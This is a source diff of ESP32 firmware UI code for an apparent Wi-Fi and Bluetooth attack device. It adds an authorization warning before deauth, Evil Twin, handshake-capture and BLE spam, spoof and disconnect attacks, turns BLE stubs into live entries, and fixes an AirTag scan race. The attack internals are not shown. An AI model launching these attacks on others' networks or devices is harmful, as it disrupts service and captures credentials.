+    lv_obj_set_style_text_color(title, lv_color_make(0xFF, 0x40, 0x40), 0);
+    lv_obj_set_style_text_font(title, &lv_font_montserrat_14, 0);
+    lv_obj_align(title, LV_ALIGN_TOP_MID, 0, 0);
+
+    lv_obj_t *msg = lv_label_create(card);
+    lv_label_set_text(msg, "These are active attacks!\nOnly use with proper\nauthorization on networks\nor devices you own.");
+    lv_obj_set_style_text_font(msg, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(msg, lv_color_white(), 0);
+    lv_label_set_long_mode(msg, LV_LABEL_LONG_WRAP);
+    lv_obj_set_width(msg, 194);
+    lv_obj_align(msg, LV_ALIGN_TOP_MID, 0, 30);
+
+    lv_obj_t *cancel_btn = lv_btn_create(card);
+    lv_obj_set_size(cancel_btn, 90, 34);
+    lv_obj_align(cancel_btn, LV_ALIGN_BOTTOM_LEFT, 0, 0);
+    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(70, 70, 70), LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(cancel_btn, lv_color_make(100, 100, 100), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(cancel_btn, 0, 0);
+    lv_obj_set_style_radius(cancel_btn, 8, 0);
+    lv_obj_t *cancel_lbl = lv_label_create(cancel_btn);
+    lv_label_set_text(cancel_lbl, "Cancel");
+    lv_obj_set_style_text_font(cancel_lbl, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(cancel_lbl, lv_color_white(), 0);
+    lv_obj_center(cancel_lbl);
+    lv_obj_add_event_cb(cancel_btn, attack_warning_dismiss_cb, LV_EVENT_CLICKED, NULL);
+
+    lv_obj_t *proceed_btn2 = lv_btn_create(card);
+    lv_obj_set_size(proceed_btn2, 90, 34);
+    lv_obj_align(proceed_btn2, LV_ALIGN_BOTTOM_RIGHT, 0, 0);
+    lv_obj_set_style_bg_color(proceed_btn2, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(proceed_btn2, lv_color_lighten(COLOR_MATERIAL_RED, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(proceed_btn2, 0, 0);
+    lv_obj_set_style_radius(proceed_btn2, 8, 0);
+    lv_obj_t *proceed_lbl2 = lv_label_create(proceed_btn2);
+    lv_label_set_text(proceed_lbl2, "I Understand");
+    lv_obj_set_style_text_font(proceed_lbl2, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(proceed_lbl2, lv_color_white(), 0);
+    lv_obj_center(proceed_lbl2);
+    lv_obj_add_event_cb(proceed_btn2, attack_warning_proceed_cb, LV_EVENT_CLICKED,
+                        (void *)proceed_fn);
+}
+
+// Proceed wrappers called after the authorization warning is accepted
+static void handshakes_proceed(void)
+{
+    g_handshaker_global_mode = true;
+    handshake_yes_btn_cb(NULL);
+}
+
+static void deauther_proceed(void)
+{
+    if (!ensure_wifi_mode()) {
+        ESP_LOGE(TAG, "Failed to switch to WiFi mode for deauth");
+        return;
+    }
+    show_function_page("Deauther");
+    wifi_scanner_save_target_bssids();
+    wifi_attacks_start_deauth();
+    {
+        int sel_indices[MAX_SCAN_RESULTS];
+        int sel_count = wifi_scanner_get_selected(sel_indices, MAX_SCAN_RESULTS);
+        uint16_t total_count = wifi_scanner_get_count();
+        wifi_ap_record_t *recs = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total_count);
+        if (recs && total_count > 0) {
+            int got_cnt = wifi_scanner_get_results(recs, total_count);
+            deauth_target_count = 0;
+            for (int i = 0; i < sel_count && deauth_target_count < MAX_SCAN_RESULTS; i++) {
+                int idx = sel_indices[i];
+                if (idx >= 0 && idx < got_cnt) {
+                    memcpy(deauth_target_bssids[deauth_target_count], recs[idx].bssid, 6);
+                    deauth_target_channels[deauth_target_count] = recs[idx].primary;
+                    deauth_target_count++;
+                }
+            }
+            lv_mem_free(recs);
+        }
+        deauth_rescan_timer_start();
+    }
+    deauth_prompt_label = lv_label_create(function_page);
+    lv_label_set_text(deauth_prompt_label, "Deauth attack in progress");
+    lv_obj_set_style_text_font(deauth_prompt_label, &lv_font_montserrat_16, 0);
+    lv_obj_set_style_text_color(deauth_prompt_label, ui_text_color(), 0);
+    lv_obj_align(deauth_prompt_label, LV_ALIGN_TOP_MID, 0, 36);
+    deauth_fps_label = lv_label_create(function_page);
+    lv_label_set_text(deauth_fps_label, "");
+    lv_obj_add_flag(deauth_fps_label, LV_OBJ_FLAG_HIDDEN);
+    if (deauth_list) { deauth_list = NULL; }
+    deauth_list = lv_list_create(function_page);
+    lv_obj_set_size(deauth_list, lv_pct(100), LCD_V_RES - 30 - 36 - 70);
+    lv_obj_align(deauth_list, LV_ALIGN_TOP_MID, 0, 60);
+    lv_obj_set_style_bg_color(deauth_list, ui_bg_color(), 0);
+    lv_obj_set_style_text_color(deauth_list, ui_text_color(), 0);
+    lv_obj_set_style_border_width(deauth_list, 0, LV_PART_ITEMS);
+    lv_obj_set_style_border_color(deauth_list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
+    int selected_indices[MAX_SCAN_RESULTS];
+    int sel_cnt = wifi_scanner_get_selected(selected_indices, MAX_SCAN_RESULTS);
+    if (sel_cnt <= 0) lv_list_add_text(deauth_list, "No networks selected");
+    uint16_t total = wifi_scanner_get_count();
+    if (total == 0) {
+        lv_list_add_text(deauth_list, "No scan results available");
+    } else {
+        wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total);
+        if (!records) {
+            lv_list_add_text(deauth_list, "Memory error");
+        } else {
+            int got = wifi_scanner_get_results(records, total);
+            for (int i = 0; i < sel_cnt; i++) {
+                int idx = selected_indices[i];
+                if (idx < 0 || idx >= got) continue;
+                const wifi_ap_record_t *ap = &records[idx];
+                char line[128];
+                const char *band = (ap->primary <= 14) ? "2.4" : "5";
+                if (ap->ssid[0] != 0) {
+                    snprintf(line, sizeof(line), "%s (Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
+                             (const char *)ap->ssid, ap->primary, band,
+                             ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+                } else {
+                    snprintf(line, sizeof(line), "(Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
+                             ap->primary, band,
+                             ap->bssid[0], ap->bssid[1], ap->bssid[2],
+                             ap->bssid[3], ap->bssid[4], ap->bssid[5]);
+                }
+                lv_obj_t *row = lv_list_add_btn(deauth_list, NULL, "");
+                lv_obj_set_width(row, lv_pct(100));
+                lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
+                lv_obj_set_style_pad_all(row, 6, 0);
+                lv_obj_set_style_pad_gap(row, 8, 0);
+                lv_obj_set_height(row, LV_SIZE_CONTENT);
+                lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
+                lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
+                lv_obj_set_style_radius(row, 8, 0);
+                lv_obj_t *lbl = lv_label_create(row);
+                lv_label_set_text(lbl, line);
+                lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
+                lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
+                lv_obj_set_style_text_color(lbl, ui_text_color(), 0);
+                lv_obj_set_width(lbl, lv_pct(95));
+            }
+            lv_mem_free(records);
+        }
+    }
+    lv_obj_t *stop_tile = lv_btn_create(function_page);
+    lv_obj_set_size(stop_tile, 120, 55);
+    lv_obj_align(stop_tile, LV_ALIGN_BOTTOM_MID, 0, -10);
+    lv_obj_set_style_bg_color(stop_tile, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
+    lv_obj_set_style_bg_color(stop_tile, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
+    lv_obj_set_style_border_width(stop_tile, 0, 0);
+    lv_obj_set_style_radius(stop_tile, 10, 0);
+    lv_obj_set_style_shadow_width(stop_tile, 6, 0);
+    lv_obj_set_style_shadow_color(stop_tile, lv_color_make(0, 0, 0), 0);
+    lv_obj_set_style_shadow_opa(stop_tile, LV_OPA_40, 0);
+    lv_obj_set_flex_flow(stop_tile, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(stop_tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_t *x_icon = lv_label_create(stop_tile);
+    lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
+    lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_20, 0);
+    lv_obj_set_style_text_color(x_icon, ui_text_color(), 0);
+    lv_obj_t *stop_text = lv_label_create(stop_tile);
+    lv_label_set_text(stop_text, "Stop & Exit");
+    lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(stop_text, ui_text_color(), 0);
+    lv_obj_add_event_cb(stop_tile, deauth_quit_event_cb, LV_EVENT_CLICKED, NULL);
+    deauth_quit_btn = stop_tile;
+    deauth_pause_btn = NULL;
+    deauth_paused = false;
+}
+
 void attack_event_cb(lv_event_t *e)
 {
     const char *attack_name = (const char *)lv_event_get_user_data(e);
@@ -19849,157 +22151,12 @@ void attack_event_cb(lv_event_t *e)
     }
 
     if (strcmp(attack_name, "Deauther") == 0) {
-        // Ensure WiFi mode is active (switch from BLE if needed)
-        if (!ensure_wifi_mode()) {
-            ESP_LOGE(TAG, "Failed to switch to WiFi mode for deauth");
-            return;
-        }
-        
-        // Open Deauther page
-        show_function_page("Deauther");
-
-        // Save current selection as attack targets, then start deauth
-        wifi_scanner_save_target_bssids();
-        wifi_attacks_start_deauth();
-        
-        // Store targets for rescan comparison and start rescan timer
-        {
-            int sel_indices[MAX_SCAN_RESULTS];
-            int sel_count = wifi_scanner_get_selected(sel_indices, MAX_SCAN_RESULTS);
-            uint16_t total_count = wifi_scanner_get_count();
-            wifi_ap_record_t *recs = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total_count);
-            if (recs && total_count > 0) {
-                int got_cnt = wifi_scanner_get_results(recs, total_count);
-                deauth_target_count = 0;
-                for (int i = 0; i < sel_count && deauth_target_count < MAX_SCAN_RESULTS; i++) {
-                    int idx = sel_indices[i];
-                    if (idx >= 0 && idx < got_cnt) {
-                        memcpy(deauth_target_bssids[deauth_target_count], recs[idx].bssid, 6);
-                        deauth_target_channels[deauth_target_count] = recs[idx].primary;
-                        deauth_target_count++;
-                    }
-                }
-                lv_mem_free(recs);
-            }
-            deauth_rescan_timer_start();
-        }
-
-        // Title centered at top - "Deauth attack in progress"
-        deauth_prompt_label = lv_label_create(function_page);
-        lv_label_set_text(deauth_prompt_label, "Deauth attack in progress");
-        lv_obj_set_style_text_font(deauth_prompt_label, &lv_font_montserrat_16, 0);
-        lv_obj_set_style_text_color(deauth_prompt_label, ui_text_color(), 0);
-        lv_obj_align(deauth_prompt_label, LV_ALIGN_TOP_MID, 0, 36);
-
-        // FPS label (hidden, but kept for internal use)
-        deauth_fps_label = lv_label_create(function_page);
-        lv_label_set_text(deauth_fps_label, "");
-        lv_obj_add_flag(deauth_fps_label, LV_OBJ_FLAG_HIDDEN);
-
-        // Build list of attacked networks with SSID, Freq, BSSID
-        if (deauth_list) { deauth_list = NULL; }
-        deauth_list = lv_list_create(function_page);
-        lv_obj_set_size(deauth_list, lv_pct(100), LCD_V_RES - 30 - 36 - 70);  // Leave space for stop tile
-        lv_obj_align(deauth_list, LV_ALIGN_TOP_MID, 0, 60);
-        lv_obj_set_style_bg_color(deauth_list, ui_bg_color(), 0);
-        lv_obj_set_style_text_color(deauth_list, ui_text_color(), 0);
-        lv_obj_set_style_border_width(deauth_list, 0, LV_PART_ITEMS);
-        lv_obj_set_style_border_color(deauth_list, lv_color_make(0, 0, 0), LV_PART_ITEMS);
-
-        int selected_indices[MAX_SCAN_RESULTS];
-        int sel_cnt = wifi_scanner_get_selected(selected_indices, MAX_SCAN_RESULTS);
-        if (sel_cnt <= 0) {
-            lv_list_add_text(deauth_list, "No networks selected");
-        }
-
-        uint16_t total = wifi_scanner_get_count();
-        if (total == 0) {
-            lv_list_add_text(deauth_list, "No scan results available");
-        } else {
-            wifi_ap_record_t *records = (wifi_ap_record_t *)lv_mem_alloc(sizeof(wifi_ap_record_t) * total);
-            if (!records) {
-                lv_list_add_text(deauth_list, "Memory error");
-            } else {
-                int got = wifi_scanner_get_results(records, total);
-
-                for (int i = 0; i < sel_cnt; i++) {
-                    int idx = selected_indices[i];
-                    if (idx < 0 || idx >= got) continue;
-
-                    const wifi_ap_record_t *ap = &records[idx];
-                    char line[128];
-                    const char *band = (ap->primary <= 14) ? "2.4" : "5";
-                    
-                    if (ap->ssid[0] != 0) {
-                        snprintf(line, sizeof(line), "%s (Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
-                                 (const char *)ap->ssid, ap->primary, band,
-                                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
-                                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
-                    } else {
-                        snprintf(line, sizeof(line), "(Ch%d, %s) %02X:%02X:%02X:%02X:%02X:%02X",
-                                 ap->primary, band,
-                                 ap->bssid[0], ap->bssid[1], ap->bssid[2],
-                                 ap->bssid[3], ap->bssid[4], ap->bssid[5]);
-                    }
-
-                    lv_obj_t *row = lv_list_add_btn(deauth_list, NULL, "");
-                    lv_obj_set_width(row, lv_pct(100));
-                    lv_obj_set_flex_flow(row, LV_FLEX_FLOW_ROW);
-                    lv_obj_set_style_pad_all(row, 6, 0);
-                    lv_obj_set_style_pad_gap(row, 8, 0);
-                    lv_obj_set_height(row, LV_SIZE_CONTENT);
-                    lv_obj_set_style_bg_color(row, ui_card_color(), LV_STATE_DEFAULT);
-                    lv_obj_set_style_bg_color(row, lv_color_make(50, 50, 50), LV_STATE_PRESSED);
-                    lv_obj_set_style_radius(row, 8, 0);
-
-                    lv_obj_t *lbl = lv_label_create(row);
-                    lv_label_set_text(lbl, line);
-                    lv_label_set_long_mode(lbl, LV_LABEL_LONG_SCROLL_CIRCULAR);
-                    lv_obj_set_style_text_font(lbl, &lv_font_montserrat_12, 0);
-                    lv_obj_set_style_text_color(lbl, ui_text_color(), 0);
-                    lv_obj_set_width(lbl, lv_pct(95));
-                }
-
-                lv_mem_free(records);
-            }
-        }
-
-        // Stop & Exit tile at bottom (red with X icon)
-        lv_obj_t *stop_tile = lv_btn_create(function_page);
-        lv_obj_set_size(stop_tile, 120, 55);
-        lv_obj_align(stop_tile, LV_ALIGN_BOTTOM_MID, 0, -10);
-        lv_obj_set_style_bg_color(stop_tile, COLOR_MATERIAL_RED, LV_STATE_DEFAULT);
-        lv_obj_set_style_bg_color(stop_tile, lv_color_lighten(COLOR_MATERIAL_RED, 50), LV_STATE_PRESSED);
-        lv_obj_set_style_border_width(stop_tile, 0, 0);
-        lv_obj_set_style_radius(stop_tile, 10, 0);
-        lv_obj_set_style_shadow_width(stop_tile, 6, 0);
-        lv_obj_set_style_shadow_color(stop_tile, lv_color_make(0, 0, 0), 0);
-        lv_obj_set_style_shadow_opa(stop_tile, LV_OPA_40, 0);
-        lv_obj_set_flex_flow(stop_tile, LV_FLEX_FLOW_COLUMN);
-        lv_obj_set_flex_align(stop_tile, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
-        
-        lv_obj_t *x_icon = lv_label_create(stop_tile);
-        lv_label_set_text(x_icon, LV_SYMBOL_CLOSE);
-        lv_obj_set_style_text_font(x_icon, &lv_font_montserrat_20, 0);
-        lv_obj_set_style_text_color(x_icon, ui_text_color(), 0);
-        
-        lv_obj_t *stop_text = lv_label_create(stop_tile);
-        lv_label_set_text(stop_text, "Stop & Exit");
-        lv_obj_set_style_text_font(stop_text, &lv_font_montserrat_12, 0);
-        lv_obj_set_style_text_color(stop_text, ui_text_color(), 0);
-        
-        lv_obj_add_event_cb(stop_tile, deauth_quit_event_cb, LV_EVENT_CLICKED, NULL);
-        
-        // Store reference (reuse quit_btn pointer)
-        deauth_quit_btn = stop_tile;
-        deauth_pause_btn = NULL;  // No pause button anymore
-        
-        deauth_paused = false;
+        show_attack_warning(deauther_proceed);
         return;
     }
 
     if (strcmp(attack_name, "Evil Twin") == 0) {
-        show_evil_twin_page();
+        show_attack_warning(show_evil_twin_page);
         return;
     }
 
@@ -20169,9 +22326,7 @@ void attack_event_cb(lv_event_t *e)
     }
 
     if (strcmp(attack_name, "Handshakes") == 0) {
-        // Auto-start handshake attack immediately for all networks
-        g_handshaker_global_mode = true;
-        handshake_yes_btn_cb(NULL);
+        show_attack_warning(handshakes_proceed);
         return;
     }
 
@@ -20619,17 +22774,39 @@ void attack_event_cb(lv_event_t *e)
         return;
     }
 
-    // BT Attacks — Coming Soon stubs
+    // Directed BT Attacks menu — target-specific attacks from SAS actions screen
+    if (strcmp(attack_name, "Directed BT Attacks") == 0) {
+        show_directed_bt_attacks_screen();
+        return;
+    }
+
+    // Device Spoof from SAS actions — pre-loads selected device, returns to actions
+    if (strcmp(attack_name, "BLE Spoof SAS") == 0) {
+        show_attack_warning(ble_spoof_proceed_from_sas);
+        return;
+    }
+
+    // BLE Disconnect from SAS actions — pre-loads selected device, returns to actions
+    if (strcmp(attack_name, "BLE Disc SAS") == 0) {
+        show_attack_warning(ble_disc_proceed_from_sas);
+        return;
+    }
+
+    // BT Attacks — active attacks guarded by authorization warning
     if (strcmp(attack_name, "BLE Spam") == 0) {
-        show_stub_screen("BLE Spam", show_bt_attacks_screen);
+        show_attack_warning(show_ble_spam_screen);
+        return;
+    }
+    if (strcmp(attack_name, "BLE Spoof General") == 0) {
+        show_attack_warning(show_ble_spoof_general_screen);
         return;
     }
     if (strcmp(attack_name, "BLE Spoof") == 0) {
-        show_stub_screen("Device Spoof", show_bt_attacks_screen);
+        show_attack_warning(show_ble_spoof_screen);
         return;
     }
     if (strcmp(attack_name, "BLE Disconnect") == 0) {
-        show_stub_screen("BLE Disconnect", show_bt_attacks_screen);
+        show_attack_warning(show_ble_disc_screen);
         return;
     }
 
@@ -22378,45 +24555,40 @@ static void show_deauth_monitor_screen(void)
 static void airtag_scan_task(void *pvParameters)
 {
     (void)pvParameters;
-    
+
     ESP_LOGI(TAG, "AirTag scanner task started");
-    
+
     while (airtag_scan_active) {
-        // Reset counters for each scan cycle
         bt_reset_counters();
-        
-        // Start BLE scan
+
         int rc = bt_start_scan();
         if (rc != 0) {
             ESP_LOGE(TAG, "BLE scan start failed: %d", rc);
             vTaskDelay(pdMS_TO_TICKS(1000));
             continue;
         }
-        
-        // Scan for 10 seconds
-        for (int i = 0; i < 100 && airtag_scan_active; i++) {
+
+        /* Scan for 10 seconds, bail early if cancelled */
+        for (int i = 0; i < 100 && airtag_scan_active; i++)
             vTaskDelay(pdMS_TO_TICKS(100));
-        }
-        
-        // Stop scan
-        bt_stop_scan();
-        
-        if (!airtag_scan_active) {
+
+        /* Only stop the scan if we weren't cancelled — the exit callback
+         * already called bt_stop_scan() and we must not race with it */
+        if (airtag_scan_active)
+            bt_stop_scan();
+
+        if (!airtag_scan_active)
             break;
-        }
-        
-        // Save snapshot for UI before reset
-        airtag_scan_snapshot_airtag = bt_airtag_count;
+
+        airtag_scan_snapshot_airtag  = bt_airtag_count;
         airtag_scan_snapshot_smarttag = bt_smarttag_count;
-        airtag_scan_snapshot_total = bt_device_count;
-        
-        // Signal UI update
+        airtag_scan_snapshot_total   = bt_device_count;
         airtag_scan_update_flag = true;
-        
+
         ESP_LOGI(TAG, "AirTag scan cycle: %d AT, %d ST, %d total",
                  airtag_scan_snapshot_airtag, airtag_scan_snapshot_smarttag, airtag_scan_snapshot_total);
     }
-    
+
     ESP_LOGI(TAG, "AirTag scanner task ending");
     airtag_scan_task_handle = NULL;
     vTaskDelete(NULL);
@@ -22426,34 +24598,31 @@ static void airtag_scan_task(void *pvParameters)
 static void airtag_scan_exit_cb(lv_event_t *e)
 {
     (void)e;
-    
+
     ESP_LOGI(TAG, "Stopping AirTag scanner...");
-    
-    // Stop scanning
-    airtag_scan_active = false;
+
+    airtag_scan_active   = false;
     airtag_scan_ui_active = false;
-    
-    // Stop BLE scan
+
+    /* Stop the scan — task will not call bt_stop_scan() again after seeing
+     * airtag_scan_active=false, so there is no race here */
     bt_stop_scan();
-    
-    // Wait for task to finish
-    if (airtag_scan_task_handle != NULL) {
-        vTaskDelay(pdMS_TO_TICKS(200));
-    }
-    
-    // Free task stack
+
+    /* Wait for the task to self-delete (sets handle to NULL), up to 2 s */
+    for (int i = 0; i < 20 && airtag_scan_task_handle != NULL; i++)
+        vTaskDelay(pdMS_TO_TICKS(100));
+
+    /* Safe to free the stack now that the task has exited */
     if (airtag_scan_task_stack != NULL) {
         heap_caps_free(airtag_scan_task_stack);
         airtag_scan_task_stack = NULL;
     }
-    
-    // Switch back to WiFi mode
+
     if (current_radio_mode == RADIO_MODE_BLE) {
         bt_nimble_deinit();
         current_radio_mode = RADIO_MODE_NONE;
     }
-    
-    // Return to Bluetooth screen
+
     show_bluetooth_screen();
 }
 
@@ -22467,11 +24636,19 @@ static void airtag_view_tags_btn_cb(lv_event_t *e)
 }
 
 /**
- * Button callback: return from Found Tags list back to AirTag scan screen
+ * Button callback: return from Found Tags list back to AirTag scan screen.
+ * The scan task is still running — just rebuild the UI, do NOT restart the task.
  */
 static void found_tags_back_btn_cb(lv_event_t *e)
 {
     (void)e;
+    if (airtag_scan_active) {
+        /* Scan already running — rebuild UI only, no new task/stack */
+        if (function_page) { lv_obj_del(function_page); function_page = NULL; }
+        reset_function_page_children();
+        /* Re-enter show_airtag_scan_screen() which now detects active scan
+         * and skips task creation */
+    }
     show_airtag_scan_screen();
 }
 
@@ -22833,26 +25010,30 @@ static void show_airtag_scan_screen(void)
 
     lv_obj_add_event_cb(exit_btn, airtag_scan_exit_cb, LV_EVENT_CLICKED, NULL);
     
-    // Set UI active and start scanning
     airtag_scan_ui_active = true;
-    airtag_scan_active = true;
-    airtag_scan_update_flag = false;
-    
-    // Create scanning task with PSRAM stack
-    airtag_scan_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
-    if (airtag_scan_task_stack) {
-        airtag_scan_task_handle = xTaskCreateStatic(
-            airtag_scan_task,
-            "airtag_scan",
-            4096,
-            NULL,
-            5,
-            airtag_scan_task_stack,
-            &airtag_scan_task_buffer
-        );
+
+    if (!airtag_scan_active) {
+        /* Fresh start — launch the scan task */
+        airtag_scan_active = true;
+        airtag_scan_update_flag = false;
+
+        airtag_scan_task_stack = (StackType_t *)heap_caps_malloc(4096 * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
+        if (airtag_scan_task_stack) {
+            airtag_scan_task_handle = xTaskCreateStatic(
+                airtag_scan_task,
+                "airtag_scan",
+                4096,
+                NULL,
+                5,
+                airtag_scan_task_stack,
+                &airtag_scan_task_buffer
+            );
+        } else {
+            ESP_LOGE(TAG, "Failed to allocate AirTag scan task stack");
+        }
+        ESP_LOGI(TAG, "AirTag scanner started");
     } else {
-        ESP_LOGE(TAG, "Failed to allocate AirTag scan task stack");
+        /* Returning from Found Tags — task already running, UI rebuilt only */
+        ESP_LOGI(TAG, "AirTag scanner UI restored (task already running)");
     }
-    
-    ESP_LOGI(TAG, "AirTag scanner started");
 }
